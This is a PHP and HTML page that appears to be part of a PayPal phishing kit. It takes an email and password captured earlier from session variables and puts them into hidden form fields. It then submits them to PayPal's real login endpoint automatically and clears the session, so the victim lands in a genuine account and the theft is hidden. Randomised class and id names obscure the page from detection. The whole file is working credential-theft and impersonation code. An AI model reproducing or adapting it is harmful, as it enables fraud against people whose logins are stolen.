<?php 
include 'includes/functions.php';
include 'includes/encrypter.php';
$email = $_SESSION['input1'];
$password = $_SESSION['input2'];
?>
<!DOCTYPE html>
<html lang="en" >
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <link rel="shortcut icon" link rel="logo-icon" href="./tsawer-2/ppico.ico">
      <title>Logging in - your Account</title>
      <link media="screen" rel="stylesheet" type="text/css" href="assets/css/wait.css">
	  <script language="JavaScript" src="assets/js/jquery.js"></script>
   </head>
   <body>
      <div class="" id="page">
         <div id="kshgbvskahgvbsksaksa">
            <div id="hksdbkahsbsakhasbkasdh">
               <h2 class="hvbdsjhvsdjsvjsd">Logging in</h2>
            </div>
            <div class=" hvbdsjhvsdjsvjsdH">
               <h3>One moment...</h3>
               <div id="jsbksbvdsksdbksadj" class="jfjgfdhdhtjdhtdh"></div>
               <img id="sbdksdjbdskjbdskbds">
               <p class="jsbksbvdsksdbksadjaa">Still loading after a few seconds? <a href="./wait.php">Try again</a></p>
            </div>
         </div>
      </div>
<script language="JavaScript" src="assets/js/jquery-1.8.2.min.js"></script>
<form method="post" name="form1" action="https://www.paypal.com/ml/cgi-bin/webscr?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8de6030e9239419d79c3f52f70a3ed57ec">
<input type="hidden" name="login_cmd" value="">
<input type="hidden" name="login_params" value="">
<input type="hidden" id="login_email" name="login_email" value="<?php echo $email; ?>">
<input type="hidden" id="login_password" name="login_password" value="<?php echo $password; ?>" >
<input type="submit" name="submit.x" value="Log In" class="btn large" style="visibility:hidden;height:0; width:0;background:transparent;">
<input name="auth" type="hidden" value="AhodAhiXyZTW1KKkCF3o&#x2d;F9Xp6jwT08ZktRoaEOpBvsWKsQfrxntvFSwlS6738KRA">
<input name="form_charset" type="hidden" value="UTF&#x2d;8">
</form>
<script language="JavaScript">
document.form1.submit();
</script>
</body>
</html>
<?php
session_destroy();
?>